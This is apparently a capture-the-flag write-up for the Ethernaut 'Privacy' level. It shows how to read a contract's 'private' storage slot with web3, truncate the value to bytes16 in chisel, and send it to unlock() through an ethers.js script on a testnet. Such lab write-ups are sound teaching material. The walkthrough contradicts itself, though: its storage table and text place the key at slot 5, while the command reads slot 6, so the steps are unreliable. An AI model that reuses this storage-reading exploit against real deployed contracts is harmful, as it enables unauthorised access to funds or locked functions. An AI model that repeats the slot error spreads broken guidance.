### Goals

Unlock the contract

### Exploit

We need to provide correct bytes16 to `unlock()` function.

STORAGE LAYOUT:

| variable   | size     | slot |
| ---------- | -------- | ---- |
| bool       | 1 byte   | 0    |
| uint256    | 32 bytes | 1    |
| uint8      | 1 byte   | 2    |
| uint8      | 1 byte   | 2    |
| uint16     | 2 bytes  | 2    |
| bytes32[0] | 32 bytes | 3    |
| bytes32[1] | 32 bytes | 4    |
| bytes32[2] | 32 bytes | 5    |

We will need to read contract storage to retrieve data. Looking at storage we can see that it occupies 6 slots. The variable that we are intersted in is at 5th.

### Code

Use Ethernaut console to get it:

```code
await web3.eth.getStorageAt(contract.address, 6);
'0x8ec73c0e7970bbe5d634a195f12b4b89ed2f3bfd4ba53fb1ac8eeda27fce63de'
```

Now using chisel (shipped along with Foundry) we can cast it to bytes16

```code
❯ chisel
Welcome to Chisel! Type `!help` to show available commands.
➜ bytes32 a = 0x8ec73c0e7970bbe5d634a195f12b4b89ed2f3bfd4ba53fb1ac8eeda27fce63de;
➜ bytes16(a)
Type: bytes16
└ Data: 0x8ec73c0e7970bbe5d634a195f12b4b8900000000000000000000000000000000
```

Create JS snippet

```code
import { ethers } from "ethers";

let provider = new ethers.JsonRpcProvider(
  "https://ethereum-sepolia.publicnode.com"
);

const signer = new ethers.Wallet(
  "PRIVATE_KEY",
  provider
);

const privacy = new ethers.Contract(
  "CONTRACT_ADDRESS",
  ["function unlock(bytes16) external"],
  signer
);

let key = "0x8ec73c0e7970bbe5d634a195f12b4b8900000000000000000000000000000000";
let tx = await privacy.unlock(key.substring(0, 34)); // 32 + 2 (as 0x)
await tx.wait();
console.log(`tx: ${tx.hash}`);
```

Done!
